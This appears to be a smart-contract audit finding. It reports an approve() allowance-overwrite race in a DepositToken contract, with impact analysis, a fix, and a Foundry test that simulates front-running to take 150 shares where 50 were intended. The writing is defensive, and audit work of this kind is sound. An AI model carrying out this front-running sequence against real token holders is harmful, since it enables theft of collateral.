### Title
DepositToken allowance overwrite enables front-running double-spend of approved collateral shares - (File: contracts/DepositToken.sol)

### Summary
`DepositToken.approve()` replaces an existing allowance without requiring the spender’s current allowance to be zero or fully consumed first. An approved spender can front-run an allowance reduction by spending the old allowance, then spend the newly approved amount after the owner’s transaction executes.

### Finding Description
`approve()` calls `_approve()` unconditionally [1](#0-0) , and `_approve()` performs a direct overwrite of `allowance[owner_][spender_]` [2](#0-1) . `transferFrom()` independently subtracts from the then-current allowance before moving deposit-token shares [3](#0-2) . Therefore, if an owner changes an allowance from `A` to `B`, the spender can consume `A` before the change and `B` afterward, obtaining `A + B` shares rather than the owner’s intended final authorization. `decreaseAllowance()` is available as a safer path, but it does not prevent callers from using the unsafe overwrite exposed by `approve()` [4](#0-3) .

### Impact Explanation
An attacker who receives a nonzero allowance can steal more deposit-token shares than the victim intended to authorize. Stolen `DepositToken` balances represent claims on collateral; after transferring unlocked shares, the attacker can call `withdraw()` to burn them and receive underlying collateral through `Treasury.pull()` [5](#0-4) [6](#0-5) . The invariant broken is allowance identity: the final intended allowance is not preserved because a historical allowance can be spent in addition to the replacement allowance.

### Likelihood Explanation
The exploit requires a victim to change an existing nonzero allowance directly with `approve()` and requires enough unlocked balance to satisfy both transfers. The only attacker capability needed is an EOA sending `transferFrom()` transactions and front-running the victim’s approval transaction. `transferFrom()` is externally callable and its `nonReentrant` modifier does not prevent two separate transactions [7](#0-6) . The `_revertIfLocked()` check limits the attack to the victim’s unlocked collateral balance, but does not prevent theft of that unlocked amount [8](#0-7) .

### Recommendation
Do not expose an allowance overwrite from one nonzero value to another. Require `amount_ == 0` when the current allowance is nonzero, or require callers to use `increaseAllowance()` and `decreaseAllowance()` exclusively. A safer implementation is:

```solidity
function approve(address spender_, uint256 amount_) external override returns (bool) {
    address owner_ = _msgSender();
    if (amount_ != 0 && allowance[owner_][spender_] != 0) {
        revert NonZeroToNonZeroApproval();
    }
    _approve(owner_, spender_, amount_);
    return true;
}
```

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

interface IDepositToken {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function unlockedBalanceOf(address account) external view returns (uint256);
}

contract DepositTokenApprovalRaceTest is Test {
    IDepositToken depositToken = IDepositToken(DEPOSIT_TOKEN_ADDRESS);

    address victim = VICTIM_WITH_UNLOCKED_SHARES;
    address attacker = ATTACKER_EOA;

    function test_allowanceFrontRunDoubleSpend() public {
        uint256 firstAllowance = 100 ether;
        uint256 replacementAllowance = 50 ether;

        assertGe(depositToken.unlockedBalanceOf(victim), firstAllowance + replacementAllowance);

        // Victim initially approves 100.
        vm.prank(victim);
        depositToken.approve(attacker, firstAllowance);

        // Attacker front-runs victim's later approve(50) and spends 100.
        vm.prank(attacker);
        depositToken.transferFrom(victim, attacker, firstAllowance);
        assertEq(depositToken.balanceOf(attacker), firstAllowance);

        // Victim intends final allowance to be only 50.
        vm.prank(victim);
        depositToken.approve(attacker, replacementAllowance);

        // Attacker spends the replacement allowance too.
        vm.prank(attacker);
        depositToken.transferFrom(victim, attacker, replacementAllowance);

        // Attacker receives 150 despite victim's intended final allowance of 50.
        assertEq(depositToken.balanceOf(attacker), firstAllowance + replacementAllowance);
    }
}
```
